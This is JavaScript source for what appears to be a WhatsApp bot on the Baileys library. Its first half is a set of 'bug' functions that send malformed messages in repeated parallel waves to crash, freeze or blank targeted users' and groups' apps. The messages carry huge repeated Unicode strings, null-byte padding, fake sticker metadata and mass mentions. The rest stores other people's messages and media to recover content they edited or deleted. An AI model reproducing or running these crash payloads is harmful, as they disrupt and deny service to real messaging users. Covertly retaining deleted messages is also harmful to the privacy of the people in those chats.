async function zalthrexhytam(devtrust, target) {
    devtrust.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: false,
                            title: "Radiation¿" 
                            + "ꦽ".repeat(50000),
                        },
                        body: {
                            text: "",
                        },
                        nativeFlowMessage: {
                            name: "single_select",
                            messageParamsJson: "",
                        },
                        payment: {
                            name: "galaxy_message",
                            messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
                        },
                    },
                },
            },
        },
        {}
    );
}
// end Of Function
//=============GROUP BUGS===========//
 async function rusuhgc(target) {
      try {
        const msg = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                inviteExpiration: Date.now() + 1814400000
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "{}"
            }, {
              name: "galaxy_message",
              paramsJson: {
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: "nullOnTop",
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: "null@gmail.com",
                screen_1_TextInput_3: "94643116",
                screen_0_TextInput_0: "\0".repeat(500000),
                screen_0_TextInput_1: "SecretDocu",
                screen_0_Dropdown_2: "#926-Xnull",
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          contextInfo: {
            mentionedJid: Array.from({
              length: 5
            }, () => "0@s.whatsapp.net"),
            groupMentions: [{
              groupJid: "0@s.whatsapp.net",
              groupSubject: "Vampire"
            }]
          }
        };
        await devtrust.relayMessage(target, msg, {
          userJid: target
        });
      } catch (err) {
        console.error("Error sending newsletter:", err);
      }
    }

//========KILL GC BUG FUNC==========//
    async function killgc(target) {
      let massage = [];
      for (let r = 0; r < 1000; r++) {
        massage.push({
          fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
          isAnimated: true,
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        });
      }
      const msg = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\0".repeat(1000000),
              version: 3
            },
            stickerPackMessage: {
              stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
              name: "WOI GRUP KONTOL",
              publisher: "",
              stickers: massage,
              fileLength: "999999999999999",
              fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
              fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
              mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
              directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
              mediaKeyTimestamp: "99999999",
              trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
              thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
              thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
              thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
              thumbnailHeight: 99999999999,
              thumbnailWidth: 9999999999,
              imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
              stickerPackSize: 9999999999999,
              stickerPackOrigin: 9999999999999,
              contextInfo: {
                mentionedJid: Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 9741,
                isForwarded: true,
                businessMessageForwardInfo: {
                  businessOwnerJid: target
                },
                externalAdReply: {
                  title: "*CYBERCRASHERRULES*",
                  body: "Grup Kontol"
                }
              }
            }
          }
        }
      };
      await devtrust.relayMessage(target, msg, {});
    }
// END OF FUNC //
//========BLANK GC========//
async function blankgc(target) {
       devtrust.relayMessage(target, {
             newsletterAdminInviteMessage: {
           newsletterJid: "120363420088299543@newsletter",
           newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "XxX".repeat(9000),
           caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "XxX".repeat(9000),
           inviteExpiration: "0",
          },
          }, {
            userJid: target
       })
       }
// END OF BUG FUNCTIONS 
//=====COMBINING ALL GC BUG======//
async function bug3(isTarget) {
for (let i = 0; i < 15; i++) {
  if (_atk.stopAttacks) return;
  await Promise.allSettled([
    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
  ]);
  await sleep(80 + Math.floor(Math.random() * 120));
}
console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
}
// CYBERE //
//FUNCT BUG GROUP VAMPIRE, #THANKS VAMP   
async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "*CYBER CRASHER KILL GROUP*" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

// ============ BLANK GROUP FUNCTION ============
async function BlankGroup(target) {
    try {
        console.log(chalk.blue(`🎯 Starting BlankGroup attack on ${target}`));
        
        // Run multiple group bug functions
        await blankgc(target);
        await sleep(1500);
        
        await BugGb1(target);
        await sleep(1500);
        
        await BugGb12(target);
        await sleep(1500);
        
        await rusuhgc(target);
        await sleep(1500);
        
        console.log(chalk.green(`✅ BlankGroup attack completed on ${target}`));
    } catch (err) {
        console.error("BlankGroup error:", err.message);
    }
}

async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "*CYBER CRASHER*" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}    
// ============ IOS OVER FUNCTION (FIXED) ============
async function iosOver(durationHours, XS) {
    console.log(chalk.yellow('⚠️ iosOver function is starting...'));
    
    // If you CYBER't have XiosVirus and TrashLocIOS, just use existing functions
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 3; // Reduced for safety
    
    const sendNext = async () => {
        // Check time limit
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log(chalk.green(`✅ iosOver complete! Total batches: ${batch - 1}`));
            return;
        }
        
        try {
            if (count < 100) {
                // Use existing bug functions instead of undefined ones
                await forclose(XS);
                await sleep(500);
                await ForceXFrezee(XS);
                await sleep(500);
                await callinvisible(XS);
                
                console.log(chalk.yellow(`${count + 1}/100 completed for ${XS}`));
                count++;
                
                setTimeout(sendNext, 800);
            } else {
                console.log(chalk.green(`✅ Batch ${batch} completed`));
                
                if (batch < maxBatches) {
                    console.log(chalk.yellow(`Waiting 2 minutes...`));
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 2 * 60 * 1000);
                }
            }
        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            setTimeout(sendNext, 2000);
        }
    };
    
    sendNext();
}




// ================= ( Combo Function — parallel waves )====================
async function Combo(target) {
    for (let wave = 0; wave < 22; wave++) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            Array(18).fill(null).map((_, i) => {
                const fn = [callinvisible, ForceXFrezee, blank1][i % 3];
                return fn(target).catch(() => {});
            })
        );
        await sleep(15 + Math.floor(Math.random() * 25));
    }
}

async function fcnew(target) {
    const _run = (fn) => () => fn(target);
    const _car = () => CarouselVY4(devtrust, target);
    const vectors = [_car, _run(LocaXotion), _run(XinsooInvisV1)];
    for (let wave = 0; wave < 22; wave++) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            Array(18).fill(null).map((_, i) => vectors[i % 3]().catch(() => {}))
        );
        await sleep(15 + Math.floor(Math.random() * 25));
    }
}

async function BugGroup(target) {
    for (let i = 0; i< 200; i++) {
    await BugGb1(m.chat);
    await BugGb12(m.chat, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(target);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await BugGb12(target, ptcp = true);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BlankGroup(m.chat);
    
    
     }
     
 }

async function BayuOfficialHard(target) {
    const vectors = [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6];
    for (let wave = 0; wave < 18; wave++) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
        );
        await sleep(15 + Math.floor(Math.random() * 25));
    }
}
    
async function ForceClose(target) {
    for (let wave = 0; wave < 28; wave++) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            Array(16).fill(null).map(() => forclose(target).catch(() => {}))
        );
        await sleep(18 + Math.floor(Math.random() * 30));
    }
}
 
async function XPhone(target) {
    const _car = () => CarouselVY4(devtrust, target);
    const _ios = () => CrashLoadIos(devtrust, target);
    const vectors = [_car, _ios, forclose, LocaXotion, XinsooInvisV1, Xblanknoclick, ForceXFrezee, blank1, callinvisible];
    for (let wave = 0; wave < 20; wave++) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
        );
        await sleep(15 + Math.floor(Math.random() * 25));
    }
}
// ================= ( Bates Function )=====================
async function CYBEReress() {
    if (!text) throw "❌ Target information required";
    
    let pepec = args[0].replace(/[^0-9]/g, "");
    let thumbnailUrl = "https://files.catbox.moe/smv12k.jpeg";
    
    let ressCYBERe = `
*CYBER — Operation Complete*

▸ Type: ${command}
▸ Target: ${pepec}

System requires a 10-minute cooldown before next operation.
`;

    await devtrust.sendMessage(m.chat, {
        image: { url: thumbnailUrl },
        caption: ressCYBERe,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                title: "CYBER — Bug System",
                body: "Operation Complete",
                thumbnailUrl: thumbnailUrl,
                sourceUrl: "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B",
                mediaType: 1,
                renderLargerThumbnail: false
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363408022768294@newsletter",
                newsletterName: "CYBER",
                serverMessageId: -1
            }
        },
        headerType: 6,
        viewOnce: false
    }, { quoted: m });
}

// ============ ACCOUNT FUNCTIONS ============
const ACCOUNT_FILE = './database/accounts.json';

function loadAccounts() {
  if (!fs.existsSync(ACCOUNT_FILE)) {
    fs.writeFileSync(ACCOUNT_FILE, JSON.stringify({}));
  }
  return JSON.parse(fs.readFileSync(ACCOUNT_FILE));
}

function saveAccounts(data) {
  fs.writeFileSync(ACCOUNT_FILE, JSON.stringify(data, null, 2));
}

// ============ SESSION FUNCTIONS ============
const SESSION_FILE = './database/sessions.json';
const PAIRING_DIR = './database/pairing/';

// Ensure directories exist
if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(PAIRING_DIR)) fs.mkdirSync(PAIRING_DIR, { recursive: true });

// ============ GLOBAL VARIABLES ============
const readMore = _READ_MORE;
const Richie = "GAME CHANGER 🥶";

global.packname = "CYBER";
global.author = "GAME CHANGER";

// ============ ANTIEDIT / ANTIDELETE MESSAGE INTERCEPTOR ============
// Store only other people's messages for antiedit/antidelete recovery
// Owner/linked commands skip this — was blocking fast command replies
if (!(isCmd && _cmdFastPath) && m.key?.id && m.key?.remoteJid && !m.message?.protocolMessage && !isOwnMessage(m, devtrust)) {
    const _chatId = m.key.remoteJid;
    const _msgId = m.key.id;
    try {
        // Extract text directly — NO JSON.stringify to avoid BigInt/Buffer errors in protobuf objects
        const _storeText =
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            m.message?.imageMessage?.caption ||
            m.message?.videoMessage?.caption ||
            m.message?.documentMessage?.caption ||
            m.message?.audioMessage?.caption ||
            m.body || m.text || '';
        if (!global._antieditStore.has(_chatId)) global._antieditStore.set(_chatId, new Map());
        global._antieditStore.get(_chatId).set(_msgId, {
            content: String(_storeText || ''),
            sender: String(m.key?.participant || m.key?.remoteJid || ''),
            fromMe: Boolean(m.key?.fromMe),
            mtype: String(m.mtype || ''),
            _ts: Date.now(), // PERF FIX: used by periodic sweep (no individual setTimeout)
        });
        // PERF FIX: removed 24h setTimeout — periodic sweep handles cleanup every 30min
    } catch (e) { console.error('[ANTIEDIT STORE]', e); }
}

// ── Detect EDIT events ──
const _antieditProto = m.message?.protocolMessage;
if (_antieditProto?.editedMessage || _antieditProto?.type === 14) {
    const _aeBotNumAE = jidToNum(getBotJid(devtrust)); const _aeCfg = loadAntieditCfg(_aeBotNumAE);
    const _aeMode = _aeCfg.mode || 'off';
    if (_aeMode !== 'off') {
        try {
            const _aeOrigId = _antieditProto.key?.id;
            const _aeChatId = m.key?.remoteJid || _antieditProto.key?.remoteJid;
            const _aeIsGroup = (_aeChatId || '').endsWith('@g.us');
            // In groups: participant field hai. In DMs: remoteJid hi sender hai.
            const _aeEditedBy = _aeIsGroup
                ? (m.key?.participant || _antieditProto.key?.participant || '')
                : (_aeChatId || '');
            const _aeFromMe = m.key?.fromMe || false;
            const _aeEditedMsg = _antieditProto.editedMessage;
            const _aeNewText = _aeEditedMsg?.conversation || _aeEditedMsg?.extendedTextMessage?.text ||
                _aeEditedMsg?.imageMessage?.caption || _aeEditedMsg?.videoMessage?.caption ||
                _aeEditedMsg?.documentMessage?.caption || '';
            if (_aeChatId && _aeOrigId) {
                const _aeOrigMsg = global._antieditStore.get(_aeChatId)?.get(_aeOrigId) || null;
                const _aeOldText = _aeOrigMsg ? (_aeOrigMsg.content || '') : '';
                const _aeSender = _aeOrigMsg?.sender || _aeEditedBy || _aeChatId;
                // Strip :1 device suffix for proper number comparison
                const _aeSenderNum = (_aeSender || '').split(':')[0].split('@')[0];
                const _aeEditedByNum = (_aeEditedBy || '').split(':')[0].split('@')[0];
                const _aeTime = new Date().toLocaleString('en-US', {
                    timeZone: process.env.TIMEZONE || 'Africa/Harare', hour12: true,
                    hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric'
                });
                const _aeBotNum = jidToNum(getBotJid(devtrust));
                // Skip if bot itself edited the message
                if (_aeFromMe || _aeOrigMsg?.fromMe || _aeSenderNum === _aeBotNum || _aeEditedByNum === _aeBotNum) {
                    return;
                }
                // Mode filtering: skip events that don't match the mode scope
                if (_aeMode === 'private_pm' && _aeIsGroup) { return; }
                if (_aeMode === 'private_groups' && !_aeIsGroup) { return; }
                if (_aeMode === 'chat_groups' && !_aeIsGroup) { return; }
                if (_aeMode === 'chat' && _aeIsGroup) { return; }
                let _aeGroupName = '';
                if (_aeIsGroup) { try { _aeGroupName = (await devtrust.groupMetadata(_aeChatId)).subject; } catch (e) {} }
                const _aeMentions = [...new Set([_aeSender, _aeEditedBy].filter(j => j && j.includes('@')))];
                const _aeReport = `*✏️ ANTI-EDIT ALERT ✏️*\n\n` +
                    `*👤 Sent By:* @${_aeSenderNum}\n` +
                    (_aeIsGroup && _aeEditedByNum && _aeEditedByNum !== _aeSenderNum ? `*✏️ Edited By:* @${_aeEditedByNum}\n` : '') +
                    `*🕒 Time:* ${_aeTime}\n` +
                    (_aeIsGroup ? `*👥 Group:* ${_aeGroupName || _aeChatId.split('@')[0]}\n` : `*💬 Chat:* Private\n`) +
                    `\n*📄 Old Message:*\n${_aeOldText || '_Not available_'}\n` +
                    `\n*📝 New (Edited) Message:*\n${_aeNewText || '_Empty_'}`;
                if (_aeMode === 'chat' || _aeMode === 'chat_groups') {
                    await devtrust.sendMessage(_aeChatId, { text: _aeReport, mentions: _aeMentions });
                } else {
                    // private / private_pm / private_groups → bot ke apne saved messages (DM)
                    const _aeBotJid = getBotJid(devtrust) || _aeChatId;
                    await devtrust.sendMessage(_aeBotJid, { text: _aeReport, mentions: _aeMentions });
                }
            }
        } catch (e) { console.error('[ANTIEDIT]', e); }
    }
    return;
}

// ── Detect DELETE events ──
const _adelProto = m.message?.protocolMessage;
// type 0 = REVOKE. type 5 = also used in some Baileys builds. Both mean "delete for everyone".
if ((_adelProto?.type === 0 || _adelProto?.type === 5) && _adelProto?.key?.id) {
    // ── Handle deleted STATUS (status@broadcast) using _statusCache ──────────
    const _adelChatId0 = m.key?.remoteJid || _adelProto.key?.remoteJid || '';
    if (_adelChatId0 === 'status@broadcast' && global._statusCache) {
        try {
            const _delStatusId = _adelProto.key?.id;
            const _cachedStatus = global._statusCache?.get(_delStatusId);
            if (_cachedStatus) {
                const _statusOwnerBot = getBotJid(devtrust);
                const _statusPosterNum = (_cachedStatus.sender || '').replace('@s.whatsapp.net', '');
                const _statusCaption = `🗑️ *Deleted Status*
👤 Poster: @${_statusPosterNum}

_Auto-saved via status antidelete_`;
                const _cachedMsg = _cachedStatus.message || {};
                const _cachedType = Object.keys(_cachedMsg)[0];
                const _cachedContent = _cachedMsg[_cachedType];
                try {
                    if (_cachedType === 'imageMessage') {
                        const { downloadContentFromMessage: _dlcS } = require('@whiskeysockets/baileys');
                        const _sStream = await _dlcS(_cachedContent, 'image');
                        const _sCh = []; for await (const _sc of _sStream) _sCh.push(_sc);
                        const _sBuf = Buffer.concat(_sCh);
                        if (_sBuf.length) await devtrust.sendMessage(_statusOwnerBot, { image: _sBuf, caption: _statusCaption });
                    } else if (_cachedType === 'videoMessage') {
                        const { downloadContentFromMessage: _dlcS } = require('@whiskeysockets/baileys');
                        const _sStream = await _dlcS(_cachedContent, 'video');
                        const _sCh = []; for await (const _sc of _sStream) _sCh.push(_sc);
                        const _sBuf = Buffer.concat(_sCh);
                        if (_sBuf.length) await devtrust.sendMessage(_statusOwnerBot, { video: _sBuf, caption: _statusCaption });
                    } else if (_cachedType === 'audioMessage') {
                        const { downloadContentFromMessage: _dlcS } = require('@whiskeysockets/baileys');
                        const _sStream = await _dlcS(_cachedContent, 'audio');
                        const _sCh = []; for await (const _sc of _sStream) _sCh.push(_sc);
                        const _sBuf = Buffer.concat(_sCh);
                        if (_sBuf.length) await devtrust.sendMessage(_statusOwnerBot, { audio: _sBuf, mimetype: 'audio/ogg; codecs=opus', caption: _statusCaption });
                    } else if (_cachedType === 'conversation' || _cachedType === 'extendedTextMessage') {
                        const _sText = _cachedContent?.text || _cachedContent || '';
                        if (_sText) await devtrust.sendMessage(_statusOwnerBot, { text: `${_statusCaption}

📝 ${_sText}` });
                    } else {
                        await devtrust.sendMessage(_statusOwnerBot, { text: `${_statusCaption}

[Status type: ${_cachedType}]` });
                    }
                } catch (_se) {}
                global._statusCache.delete(_delStatusId);
            }
        } catch (_sde) {}
    }

    // Get bot identity FIRST so we can load per-bot config
    const _adBotNumPre = jidToNum(getBotJid(devtrust));
    const _adCfg = loadAntideleteCfg(_adBotNumPre);
    const _adMode = _adCfg.mode || 'off';
    if (_adMode !== 'off') {
        try {
            const _adMsgId = _adelProto.key.id;
            const _adChatId = m.key?.remoteJid || _adelProto.key?.remoteJid || '';
            const _adDeletedBy = m.key?.participant || _adelProto.key?.participant || m.key?.remoteJid || '';
            if (typeof global._adHandleMessageDelete === 'function') {
                await global._adHandleMessageDelete(devtrust, {
                    botNum: _adBotNumPre,
                    chatId: _adChatId,
                    msgId: _adMsgId,
                    deletedBy: _adDeletedBy,
                    fromMeDelete: Boolean(m.key?.fromMe),
                    altChatIds: typeof global._adChatIdsFromKey === 'function'
                        ? global._adChatIdsFromKey(m.key || _adelProto.key || {})
                        : [],
                });
            }
        } catch (e) { console.error('[ANTIDELETE]', e); }
    }
    return;
}

// ── Store messages for antidelete recovery (ALL messages — antidelete first priority) ──
if (!isCmd && typeof global._cacheMessageForAntidelete === 'function') {
    try { global._cacheMessageForAntidelete(m, devtrust); } catch (_) {}
}

// Legacy detailed store disabled — unified session cache handles all message types
(async () => {
    try {
        if (false && m.key?.id && m.key?.remoteJid && !m.message?.protocolMessage) {
            const _adMsgId2 = m.key.id;
            const _adChatId2 = m.key.remoteJid;
            let _adContent = '';
            let _adMediaType = '';
            let _adMediaPath = '';
            const _adSender2 = m.key.participant || m.key.remoteJid;
            const msg = m.message || {};

            // ── Dedup: if pair.js (or a prior pass) already cached this msg with
            //    a valid disk file, skip re-download. Saves bandwidth + I/O when
            //    the message goes through both pair.js AND case.js in public mode.
            const _adExistingShared = global._antideleteStore.get(antiStoreKey(_adChatId2, _adMsgId2));
            if (_adExistingShared?.mediaPath &&
                _adExistingShared.mediaPath !== '__redownload__' &&
                _adExistingShared.mediaPath !== '' &&
                fs.existsSync(_adExistingShared.mediaPath)) {
                // Already eagerly downloaded — touch _ts so periodic sweep keeps it alive
                _adExistingShared._ts = Date.now();
                return;
            }

            // ── Helper: eager-download media to disk with size guard ──
            // Returns the saved path if successful, '' otherwise (caller still keeps
            // rawMediaMsg metadata so a later re-download attempt can fall back).
            const _adEagerDl = async (mediaPart, baileysType, ext, byteCap) => {
                try {
                    // Quick size pre-check using protobuf fileLength (if present)
                    const _flRaw = mediaPart?.fileLength;
                    let _fl = 0;
                    if (_flRaw != null) {
                        if (typeof _flRaw === 'number') _fl = _flRaw;
                        else if (typeof _flRaw === 'bigint') _fl = Number(_flRaw);
                        else if (typeof _flRaw === 'string') _fl = parseInt(_flRaw, 10) || 0;
                        else if (typeof _flRaw === 'object' && _flRaw.low != null) {
                            _fl = (_flRaw.high || 0) * 0x100000000 + (_flRaw.low >>> 0);
                        }
                    }
                    if (byteCap && _fl > byteCap) {
                        return ''; // too big — skip disk write, fallback to re-download path
                    }

                    const { downloadContentFromMessage: _dlc } = require('@whiskeysockets/baileys');
                    const _stream = await _dlc(mediaPart, baileysType);
                    const _chunks = [];
                    let _total = 0;
                    for await (const _chunk of _stream) {
                        _total += _chunk.length;
                        if (byteCap && _total > byteCap) {
                            // mid-stream cap exceeded — abort & don't write
                            try { _stream.destroy?.(); } catch(_) {}
                            return '';
                        }
                        _chunks.push(_chunk);
                    }
                    const _buf = Buffer.concat(_chunks);
                    if (!_buf.length) return '';
                    const _path = `${ANTIDELETE_TEMP_DIR}/${_adMsgId2}.${ext}`;
                    await fs.promises.writeFile(_path, _buf);
                    return _path;
                } catch (e) { return ''; }
            };

            // ── Text messages ──
            if (msg.conversation) {
                _adContent = msg.conversation;
            } else if (msg.extendedTextMessage?.text) {
                _adContent = msg.extendedTextMessage.text;
            }
            // ── Image (cap 15 MB) ──
            else if (msg.imageMessage) {
                _adMediaType = 'image';
                _adContent = msg.imageMessage.caption || '';
                _adMediaPath = (await _adEagerDl(msg.imageMessage, 'image', 'jpg', 15 * 1024 * 1024)) || '__redownload__';
            }
            // ── Video (cap 30 MB — covers most short clips + voice notes) ──
            else if (msg.videoMessage) {
                _adMediaType = 'video';
                _adContent = msg.videoMessage.caption || '';
                _adMediaPath = (await _adEagerDl(msg.videoMessage, 'video', 'mp4', 30 * 1024 * 1024)) || '__redownload__';
            }
            // ── Audio / Voice note (cap 15 MB) ──
            else if (msg.audioMessage) {
                _adMediaType = 'audio';
                _adContent = Boolean(msg.audioMessage.ptt) ? '🎤 Voice Note' : '🎵 Audio';
                _adMediaPath = (await _adEagerDl(msg.audioMessage, 'audio', Boolean(msg.audioMessage.ptt) ? 'ogg' : 'mp3', 15 * 1024 * 1024)) || '__redownload__';
            }
            // ── Sticker (cap 5 MB — stickers are tiny) ──
            else if (msg.stickerMessage) {
                _adMediaType = 'sticker';
                _adContent = '🎭 Sticker';
                _adMediaPath = (await _adEagerDl(msg.stickerMessage, 'sticker', 'webp', 5 * 1024 * 1024)) || '__redownload__';
            }
            // ── Document (cap 25 MB — most docs fit, big files fall back to redownload) ──
            else if (msg.documentMessage) {
                _adMediaType = 'document';
                const docName = msg.documentMessage.fileName || msg.documentMessage.title || 'File';
                _adContent = `📄 Document: ${docName}`;
                // Preserve original extension when possible (sanitised)
                const _extMatch = String(docName).match(/\.([a-z0-9]{1,8})$/i);
                const _docExt = (_extMatch ? _extMatch[1] : 'bin').toLowerCase().replace(/[^a-z0-9]/g, '');
                _adMediaPath = (await _adEagerDl(msg.documentMessage, 'document', _docExt || 'bin', 25 * 1024 * 1024)) || '__redownload__';
            }
            // ── Poll ──
            else if (msg.pollCreationMessage || msg.pollCreationMessageV2 || msg.pollCreationMessageV3) {
                const poll = msg.pollCreationMessage || msg.pollCreationMessageV2 || msg.pollCreationMessageV3;
                const options = (poll.options || []).map((o, i) => `  ${i + 1}. ${o.optionName}`).join('\n');
                _adContent = `📊 *Poll:* ${poll.name}\n${options}`;
            }
            // ── Location ──
            else if (msg.locationMessage || msg.liveLocationMessage) {
                const loc = msg.locationMessage || msg.liveLocationMessage;
                _adContent = `📍 Location${loc.name ? ': ' + loc.name : ''}\nhttps://maps.google.com/?q=${loc.degreesLatitude},${loc.degreesLongitude}`;
            }
            // ── Contact ──
            else if (msg.contactMessage) {
                _adContent = `👤 Contact: ${msg.contactMessage.displayName || 'Unknown'}`;
            } else if (msg.contactsArrayMessage) {
                const names = (msg.contactsArrayMessage.contacts || []).map(c => c.displayName).join(', ');
                _adContent = `👥 Contacts: ${names}`;
            }
            // ── Reaction ──
            else if (msg.reactionMessage) {
                _adContent = `${msg.reactionMessage.text || '❤️'} Reaction`;
            }
            // ── Button / List response ──
            else if (msg.buttonsResponseMessage) {
                _adContent = `🔘 Button reply: ${msg.buttonsResponseMessage.selectedDisplayText || msg.buttonsResponseMessage.selectedButtonId || ''}`;
            } else if (msg.listResponseMessage) {
                _adContent = `📋 List reply: ${msg.listResponseMessage.title || msg.listResponseMessage.singleSelectReply?.selectedRowId || ''}`;
            }
            // ── View once (mark as such, can't resend) ──
